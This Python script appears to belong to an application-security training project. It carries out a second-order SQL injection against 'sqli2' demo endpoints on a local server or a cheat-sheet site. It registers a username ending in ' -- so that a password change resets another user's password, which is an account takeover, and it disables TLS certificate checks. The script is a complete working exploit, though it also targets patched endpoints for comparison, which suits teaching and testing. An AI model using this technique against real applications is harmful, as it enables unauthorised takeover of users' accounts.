import cli
import requests

use_vulnerable_endpoint, use_webapp_url = cli.get_cli_arguments()

if use_webapp_url:
    url_prefix = "https://appseccheat.codes"
else:
    url_prefix = "http://127.0.0.1:12300"

if use_vulnerable_endpoint:
    urls = [
        f"{url_prefix}/vulnerabilities/sqli2/get_username/",
        f"{url_prefix}/vulnerabilities/sqli2/register/",
        f"{url_prefix}/vulnerabilities/sqli2/change_password/",
    ]
else:
    urls = [
        f"{url_prefix}/patches/sqli2/get_username/",
        f"{url_prefix}/patches/sqli2/register/",
        f"{url_prefix}/patches/sqli2/change_password/",
    ]

# This configures the proxy web address if you are using one. Exploit will work regardless of whether you have a proxy enabled or not.
# This also sets verification of the server TLS certificate to false because the endpoint is just for demonstration purposes. Ignore any warnings associated with not verifying the certificate.
proxy = "127.0.0.1:8080"
proxies = {"https://": proxy, "http://": proxy}
verify = False
requests.packages.urllib3.disable_warnings()


def get_username():
    r = requests.get(urls[0], verify=verify, proxies=proxies)
    print(r.text + " is the username to reset the password for")
    return (r.cookies, r.text)


def register(cookies, username_to_exploit, original_password):
    username = f"{username_to_exploit}'-- "
    data = {"username": username, "password": original_password}

    r = requests.post(urls[1], data=data, cookies=cookies, verify=verify, proxies=proxies)
    print(r.text)
    return r.cookies


def change_password(cookies, original_password, new_password):
    data = {
        "old_password": original_password,
        "new_password1": new_password,
        "new_password2": new_password,
    }
    r = requests.post(urls[2], data=data, cookies=cookies, verify=verify, proxies=proxies)
    print(r.text)


original_password = "test"
new_password = "123456"
cookies, username_to_exploit = get_username()
cookies = register(cookies, username_to_exploit, original_password)
change_password(cookies, original_password, new_password)
